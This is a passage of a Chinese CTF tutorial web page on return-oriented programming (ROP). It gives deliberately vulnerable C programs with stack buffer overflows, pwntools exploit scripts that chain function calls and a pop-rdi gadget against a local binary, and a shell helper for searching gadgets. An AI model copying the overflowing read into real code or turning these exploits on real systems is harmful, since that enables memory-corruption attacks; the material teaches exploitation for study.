+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a><span class="c1">// gcc test.c -no-pie -fno-stack-protector -g</span>
+<a id="__codelineno-4-2" name="__codelineno-4-2" href="#__codelineno-4-2"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-4-3" name="__codelineno-4-3" href="#__codelineno-4-3"></a>
+<a id="__codelineno-4-4" name="__codelineno-4-4" href="#__codelineno-4-4"></a><span class="kt">void</span><span class="w"> </span><span class="nf">func1</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">"func1 called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-4-5" name="__codelineno-4-5" href="#__codelineno-4-5"></a>
+<a id="__codelineno-4-6" name="__codelineno-4-6" href="#__codelineno-4-6"></a><span class="kt">void</span><span class="w"> </span><span class="nf">func2</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">"func2 called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-4-7" name="__codelineno-4-7" href="#__codelineno-4-7"></a>
+<a id="__codelineno-4-8" name="__codelineno-4-8" href="#__codelineno-4-8"></a><span class="kt">void</span><span class="w"> </span><span class="nf">func3</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">printf</span><span class="p">(</span><span class="s">"func3 called</span><span class="se">\n</span><span class="s">"</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-4-9" name="__codelineno-4-9" href="#__codelineno-4-9"></a>
+<a id="__codelineno-4-10" name="__codelineno-4-10" href="#__codelineno-4-10"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-4-11" name="__codelineno-4-11" href="#__codelineno-4-11"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">str</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+<a id="__codelineno-4-12" name="__codelineno-4-12" href="#__codelineno-4-12"></a>
+<a id="__codelineno-4-13" name="__codelineno-4-13" href="#__codelineno-4-13"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="mh">0x50</span><span class="p">);</span>
+<a id="__codelineno-4-14" name="__codelineno-4-14" href="#__codelineno-4-14"></a>
+<a id="__codelineno-4-15" name="__codelineno-4-15" href="#__codelineno-4-15"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-4-16" name="__codelineno-4-16" href="#__codelineno-4-16"></a><span class="p">}</span>
+</code></pre></div>
+<p>对应的exp脚本如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="ch">#!/usr/bin/python3</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="c1"># -*- encoding: utf-8 -*-</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a>
+<a id="__codelineno-5-6" name="__codelineno-5-6" href="#__codelineno-5-6"></a><span class="c1"># context.log_level = "debug"</span>
+<a id="__codelineno-5-7" name="__codelineno-5-7" href="#__codelineno-5-7"></a><span class="c1"># context.terminal = ["konsole", "-e"]</span>
+<a id="__codelineno-5-8" name="__codelineno-5-8" href="#__codelineno-5-8"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"amd64"</span>
+<a id="__codelineno-5-9" name="__codelineno-5-9" href="#__codelineno-5-9"></a>
+<a id="__codelineno-5-10" name="__codelineno-5-10" href="#__codelineno-5-10"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./a.out"</span><span class="p">)</span>
+<a id="__codelineno-5-11" name="__codelineno-5-11" href="#__codelineno-5-11"></a>
+<a id="__codelineno-5-12" name="__codelineno-5-12" href="#__codelineno-5-12"></a><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./a.out"</span><span class="p">)</span>
+<a id="__codelineno-5-13" name="__codelineno-5-13" href="#__codelineno-5-13"></a>
+<a id="__codelineno-5-14" name="__codelineno-5-14" href="#__codelineno-5-14"></a><span class="n">func1_address</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"func1"</span><span class="p">]</span>
+<a id="__codelineno-5-15" name="__codelineno-5-15" href="#__codelineno-5-15"></a><span class="n">func2_address</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"func2"</span><span class="p">]</span>
+<a id="__codelineno-5-16" name="__codelineno-5-16" href="#__codelineno-5-16"></a><span class="n">func3_address</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"func3"</span><span class="p">]</span>
+<a id="__codelineno-5-17" name="__codelineno-5-17" href="#__codelineno-5-17"></a>
+<a id="__codelineno-5-18" name="__codelineno-5-18" href="#__codelineno-5-18"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="mh">0x28</span>
+<a id="__codelineno-5-19" name="__codelineno-5-19" href="#__codelineno-5-19"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">func1_address</span><span class="p">)</span>
+<a id="__codelineno-5-20" name="__codelineno-5-20" href="#__codelineno-5-20"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">func2_address</span><span class="p">)</span>
+<a id="__codelineno-5-21" name="__codelineno-5-21" href="#__codelineno-5-21"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">func3_address</span><span class="p">)</span>
+<a id="__codelineno-5-22" name="__codelineno-5-22" href="#__codelineno-5-22"></a>
+<a id="__codelineno-5-23" name="__codelineno-5-23" href="#__codelineno-5-23"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-5-24" name="__codelineno-5-24" href="#__codelineno-5-24"></a>
+<a id="__codelineno-5-25" name="__codelineno-5-25" href="#__codelineno-5-25"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>单看这个脚本可能会有点抽象，下面是栈帧变化的动画演示：</p>
+<p><img alt="img" src="../images/ROP/basic_rop.gif"></p>
+<h3 id="gadget">gadget<a class="headerlink" href="#gadget" title="Permanent link">¶</a></h3>
+<p>现在我们已经能够实现通过在合适的位置布置地址实现按照一定的顺序调用函数。但是这还不够精细，毕竟我们现在还很难控制调用这些函数时传递的参数（可以先了解一下Linux下C语言的调用约定）。这里就需要引入一个新的概念——gadget。</p>
+<p>gadget在这里指的是以<code>ret</code>指令结尾的代码片段，例如<code>leave; ret</code>就是一个很常用的gadget。我们可以利用各种合适的gadget拼凑出需要的程序逻辑。</p>
+<h4 id="gadget_1">获取gadget<a class="headerlink" href="#gadget_1" title="Permanent link">¶</a></h4>
+<p>获取gadget可以使用工具<code>ROPgadget</code>获取到elf文件中的大部分gadget。如下图</p>
+<p><img alt="image-20230727230856208" src="../images/ROP/image-20230727230856208.png"></p>
+<p>结果可以结合<code>grep</code>工具进行搜索，不过我更推荐结合fzf使用，但是这个需要写shell脚本，下面这个是我自己用的shell脚本，能够快速搜索，并把搜索结果存入剪贴板（使用的shell为fish，显示服务器为wayland）</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="k">function</span> find_gadget -d <span class="s2">"find gadget from binary file"</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a>    <span class="k">set</span> -l file <span class="nv">$argv</span><span class="o">[</span>1<span class="o">]</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a>    <span class="k">set</span> -l file_md5 <span class="o">(</span>md5sum <span class="nv">$file</span> <span class="o">|</span> cut -d <span class="s1">' '</span> -f 1<span class="o">)</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a>    <span class="k">if</span> ! <span class="k">test</span> -f ./gadget-<span class="nv">$file</span>-<span class="nv">$file_md5</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a>        ROPgadget --binary <span class="nv">$file</span> <span class="o">&gt;</span> ./gadget-<span class="nv">$file</span>-<span class="nv">$file_md5</span>
+<a id="__codelineno-6-7" name="__codelineno-6-7" href="#__codelineno-6-7"></a>    <span class="k">end</span>
+<a id="__codelineno-6-8" name="__codelineno-6-8" href="#__codelineno-6-8"></a>
+<a id="__codelineno-6-9" name="__codelineno-6-9" href="#__codelineno-6-9"></a>    <span class="k">set</span> -l result <span class="o">(</span>cat ./gadget-<span class="nv">$file</span>-<span class="nv">$file_md5</span> <span class="o">|</span> fzf<span class="o">)</span>
+<a id="__codelineno-6-10" name="__codelineno-6-10" href="#__codelineno-6-10"></a>
+<a id="__codelineno-6-11" name="__codelineno-6-11" href="#__codelineno-6-11"></a>    <span class="k">if</span> <span class="k">test</span> -z <span class="nv">$result</span>
+<a id="__codelineno-6-12" name="__codelineno-6-12" href="#__codelineno-6-12"></a>        <span class="k">echo</span> <span class="s2">"No gadget selected."</span>
+<a id="__codelineno-6-13" name="__codelineno-6-13" href="#__codelineno-6-13"></a>        <span class="k">return</span>
+<a id="__codelineno-6-14" name="__codelineno-6-14" href="#__codelineno-6-14"></a>    <span class="k">end</span>
+<a id="__codelineno-6-15" name="__codelineno-6-15" href="#__codelineno-6-15"></a>
+<a id="__codelineno-6-16" name="__codelineno-6-16" href="#__codelineno-6-16"></a>    <span class="k">set</span> -l addr <span class="o">(</span>string sub --length <span class="m">18</span> <span class="nv">$result</span><span class="o">)</span>
+<a id="__codelineno-6-17" name="__codelineno-6-17" href="#__codelineno-6-17"></a>
+<a id="__codelineno-6-18" name="__codelineno-6-18" href="#__codelineno-6-18"></a>    wl-copy <span class="nv">$addr</span>
+<a id="__codelineno-6-19" name="__codelineno-6-19" href="#__codelineno-6-19"></a>
+<a id="__codelineno-6-20" name="__codelineno-6-20" href="#__codelineno-6-20"></a>    <span class="k">echo</span> <span class="s2">"The offset of gadget '</span><span class="nv">$result</span><span class="s2">' has been saved to the clipboard."</span>
+<a id="__codelineno-6-21" name="__codelineno-6-21" href="#__codelineno-6-21"></a><span class="k">end</span>
+</code></pre></div>
+<h4 id="_2">示例<a class="headerlink" href="#_2" title="Permanent link">¶</a></h4>
+<p>以下面这个程序为例，目的是让程序输出<code>Hello, World!</code>：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span>
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">str</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Hello, World!"</span><span class="p">;</span>
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a><span class="kt">void</span><span class="w"> </span><span class="nf">func1</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="n">puts</span><span class="p">(</span><span class="s">"func1 called"</span><span class="p">);</span><span class="w"> </span><span class="p">}</span>
+<a id="__codelineno-7-6" name="__codelineno-7-6" href="#__codelineno-7-6"></a>
+<a id="__codelineno-7-7" name="__codelineno-7-7" href="#__codelineno-7-7"></a><span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span>
+<a id="__codelineno-7-8" name="__codelineno-7-8" href="#__codelineno-7-8"></a><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">str</span><span class="p">[</span><span class="mh">0x20</span><span class="p">];</span>
+<a id="__codelineno-7-9" name="__codelineno-7-9" href="#__codelineno-7-9"></a>
+<a id="__codelineno-7-10" name="__codelineno-7-10" href="#__codelineno-7-10"></a><span class="w">    </span><span class="n">read</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="n">str</span><span class="p">,</span><span class="w"> </span><span class="mh">0x50</span><span class="p">);</span>
+<a id="__codelineno-7-11" name="__codelineno-7-11" href="#__codelineno-7-11"></a>
+<a id="__codelineno-7-12" name="__codelineno-7-12" href="#__codelineno-7-12"></a><span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span>
+<a id="__codelineno-7-13" name="__codelineno-7-13" href="#__codelineno-7-13"></a><span class="p">}</span>
+</code></pre></div>
+<p>对应的exp脚本如下：</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="ch">#!/usr/bin/python3</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="c1"># -*- encoding: utf-8 -*-</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>
+<a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>
+<a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a><span class="c1"># context.log_level = "debug"</span>
+<a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a><span class="c1"># context.terminal = ["konsole", "-e"]</span>
+<a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a><span class="n">context</span><span class="o">.</span><span class="n">arch</span> <span class="o">=</span> <span class="s2">"amd64"</span>
+<a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>
+<a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a><span class="n">p</span> <span class="o">=</span> <span class="n">process</span><span class="p">(</span><span class="s2">"./a.out"</span><span class="p">)</span>
+<a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>
+<a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s2">"./a.out"</span><span class="p">)</span>
+<a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>
+<a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a><span class="n">puts_addr</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s2">"puts"</span><span class="p">]</span>
+<a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a><span class="n">str_hello_world</span> <span class="o">=</span> <span class="mh">0x00402004</span>
+<a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a><span class="n">pop_rdi_ret</span> <span class="o">=</span> <span class="mh">0x0000000000401203</span>
+<a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>
+<a id="__codelineno-8-18" name="__codelineno-8-18" href="#__codelineno-8-18"></a><span class="n">payload</span> <span class="o">=</span> <span class="sa">b</span><span class="s2">"A"</span> <span class="o">*</span> <span class="mh">0x28</span>
+<a id="__codelineno-8-19" name="__codelineno-8-19" href="#__codelineno-8-19"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi_ret</span><span class="p">)</span>
+<a id="__codelineno-8-20" name="__codelineno-8-20" href="#__codelineno-8-20"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">str_hello_world</span><span class="p">)</span>
+<a id="__codelineno-8-21" name="__codelineno-8-21" href="#__codelineno-8-21"></a><span class="n">payload</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">puts_addr</span><span class="p">)</span>
+<a id="__codelineno-8-22" name="__codelineno-8-22" href="#__codelineno-8-22"></a>
+<a id="__codelineno-8-23" name="__codelineno-8-23" href="#__codelineno-8-23"></a><span class="n">p</span><span class="o">.</span><span class="n">send</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
+<a id="__codelineno-8-24" name="__codelineno-8-24" href="#__codelineno-8-24"></a>
+<a id="__codelineno-8-25" name="__codelineno-8-25" href="#__codelineno-8-25"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>栈帧变化的动画演示：</p>
+<p><img alt="img" src="../images/ROP/rop_gadget.gif"></p></div>
+
+<!-- Source file information -->
+
+
+<!-- Was this page helpful? -->
+
+  
+
+
+
+
+<!-- Previous and next pages link -->
+<nav
+class="md-footer__inner md-grid"
+aria-label="页脚"
+
+>
+
+<!-- Link to previous page -->
+
+  
+  <a
+    href="../Stack_Overflow/"
+    class="md-footer__link md-footer__link--prev"
+    aria-label="上一页: 栈上数组越界&amp;栈溢出"
+    rel="prev"
+  >
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11z"/></svg>
+    </div>
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        上一页
+      </span>
+      <div class="md-ellipsis">
+        栈上数组越界&栈溢出
+      </div>
+    </div>
+  </a>
+
+
+<!-- Link to next page -->
+
+  
+  <a
+    href="../ROP_Tricks/"
+    class="md-footer__link md-footer__link--next"
+    aria-label="下一页: 常见的ROP技巧"
+    rel="next"
+  >
+    <div class="md-footer__title">
+      <span class="md-footer__direction">
+        下一页
+      </span>
+      <div class="md-ellipsis">
+        常见的ROP技巧
+      </div>
+    </div>
+    <div class="md-footer__button md-icon">
+      
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M4 11v2h12l-5.5 5.5 1.42 1.42L19.84 12l-7.92-7.92L10.5 5.5 16 11z"/></svg>
+    </div>
+  </a>
+
+</nav>
+
+<!-- Comment system -->
+
+  <h2 id="__comments">评论</h2>
+
+  <!-- giscus：主题与外壳 hc-theme 同步（初始 + 切换时 postMessage） -->
+  <script src="https://giscus.app/client.js"
+    data-repo="ProbiusOfficial/Hello-CTF"
+    data-repo-id="R_kgDOJXX6hg"
+    data-category="Show and tell"
+    data-category-id="DIC_kwDOJXX6hs4CXmuV"
+    data-mapping="pathname"
+    data-strict="0"
+    data-reactions-enabled="1"
+    data-emit-metadata="0"
+    data-input-position="top"
+    data-theme="light"
+    data-lang="zh-CN"
+    crossorigin="anonymous"
+    async>
+  </script>
+  <script>
+    (function () {
+      var script = document.querySelector("script[src*=giscus]");
+      function currentTheme() {
+        var t = null;
+        try { t = localStorage.getItem("hc-theme"); } catch (e) {}
+        return t === "dark" ? "dark" : "light";
+      }
+      /* 初始主题：giscus 加载前写入 data-theme */
+      script.setAttribute("data-theme", currentTheme());
+      /* 外壳主题切换 → 通知 giscus iframe 换肤（由 shell.js 广播 hc-theme-change） */
+      document.addEventListener("hc-theme-change", function (e) {
+        var theme = e.detail === "dark" ? "dark" : "light";
+        var iframe = document.querySelector("iframe.giscus-frame");
+        if (iframe) {
+          iframe.contentWindow.postMessage(
+            { giscus: { setConfig: { theme: theme } } },
+            "https://giscus.app"
+          );
+        }
+      });
+    })();
+  </script>
+
+  <!-- 评论区显示优化 -->
+  <style>
+    #__comments {
+      margin-top: 2.2rem;
+      padding-top: 1.2rem;
+      border-top: 1px solid var(--line, #e6eaf1);
+      font-size: 1rem;
+    }
+    .giscus, .giscus-frame { width: 100%; }
+    .giscus-frame { border: none; color-scheme: light; }
+    [data-md-color-scheme="slate"] .giscus-frame { color-scheme: dark; }
+  </style>
+
+
+<!-- 才懒得给你加空格呢 给你塞个 Pangu.js 哼！ -->
+<head>
+  <script src="https://cdn.jsdelivr.net/npm/pangu.simple@1.0.5/dist/browser/pangu.js"></script>
+  <script>
+    pangu.spacingPage();
+  </script>
+</head>
+      </article>
+      
+        <aside class="hc-toc">
+          <div class="hc-toc-cap">ON THIS PAGE</div>
+          
+  <ul>
+    
+      <li>
+        <a href="#rop">面向返回编程（ROP）</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#rop_1">ROP原理</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#32-rop">32位 ROP</a>
+        
+      </li>
+    
+      <li>
+        <a href="#64-rop">64位 ROP</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_1">示例</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+      <li>
+        <a href="#gadget">gadget</a>
+        
+  <ul>
+    
+      <li>
+        <a href="#gadget_1">获取gadget</a>
+        
+      </li>
+    
+      <li>
+        <a href="#_2">示例</a>
+        
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+      </li>
+    
+  </ul>
+
+        </aside>
+      
+    </div>
+    <footer class="hc-footer">
+      <span>© 2026 探姬 · Hello CTF</span>
+      <span class="links">
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF" target="_blank" rel="noopener">GitHub</a>
+        <a href="https://github.com/ProbiusOfficial/Hello-CTF/pulls" target="_blank" rel="noopener">参与共建</a>
+        <a href="../../sidebar/feedback.html">反馈与群聊</a>
+      </span>
+    </footer>
+  </div>
+
+  <!-- 站点原有 extra_javascript（baidu_SEO / katex / statis / FullCalendar 等） -->
+  
+    <script src="../../javascripts/baidu_SEO.js"></script>
+  
+    <script src="../../javascripts/katex.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/katex.min.js"></script>
+  
+    <script src="https://cdn.jsdelivr.net/npm/katex@0.16.8/dist/contrib/auto-render.min.js"></script>
+  
+    <script src="../../javascripts/statis.js"></script>
+  
+    <script src="../../javascripts/FullCalendar.js"></script>
+  
+    <script src="../../shell/feedback-widget.js"></script>
+  
+
+  <!-- mermaid（material bundle 移除后自行加载） -->
+  <script src="https://cdn.jsdelivr.net/npm/mermaid@10/dist/mermaid.min.js"></script>
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      if (!window.mermaid) return;
+      document.querySelectorAll("pre.mermaid").forEach(function (el) {
+        var div = document.createElement("div");
+        div.className = "mermaid";
+        div.textContent = el.textContent;
+        el.replaceWith(div);
+      });
+      try {
+        mermaid.initialize({ startOnLoad: false, theme: "neutral" });
+        mermaid.run({ querySelector: ".mermaid" });
+      } catch (e) {}
+    });
+  </script>
+
+  <!-- 代码复制按钮（material bundle 移除后自实现） -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".md-typeset pre").forEach(function (pre) {
+        if (pre.querySelector(".hc-copy") || pre.classList.contains("mermaid")) return;
+        var btn = document.createElement("button");
+        btn.className = "hc-copy";
+        btn.textContent = "复制";
+        btn.onclick = function () {
+          var text = pre.innerText.replace(/^复制\n/, "");
+          navigator.clipboard.writeText(text).then(function () {
+            btn.textContent = "已复制";
+            setTimeout(function () { btn.textContent = "复制"; }, 1500);
+          });
+        };
+        pre.appendChild(btn);
+      });
+    });
+  </script>
+
+  <!-- TOC 滚动高亮 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      var links = Array.from(document.querySelectorAll(".hc-toc a"));
+      if (!links.length) return;
+      var map = links.map(function (a) {
+        var el = document.getElementById(decodeURIComponent(a.getAttribute("href").slice(1)));
+        return el ? { a: a, el: el } : null;
+      }).filter(Boolean);
+      function spy() {
+        var current = null;
+        map.forEach(function (m) { if (m.el.getBoundingClientRect().top <= 80) current = m; });
+        links.forEach(function (a) { a.classList.remove("on"); });
+        if (current) current.a.classList.add("on");
+      }
+      document.addEventListener("scroll", spy, { passive: true });
+      spy();
+    });
+  </script>
+
+  <!-- 顶部导航下拉：fixed 定位避开 overflow 裁剪 -->
+  <script>
+    document.addEventListener("DOMContentLoaded", function () {
+      document.querySelectorAll(".tn-item").forEach(function (item) {
+        var drop = item.querySelector(".tn-drop");
+        if (!drop) return;
+        item.addEventListener("mouseenter", function () {
+          var r = item.getBoundingClientRect();
+          drop.style.top = r.bottom + "px";
+          var left = Math.min(r.left, window.innerWidth - 240);
+          drop.style.left = Math.max(10, left) + "px";
+        });
+      });
+    });
+  </script>
+
+  
+</body>
+</html>
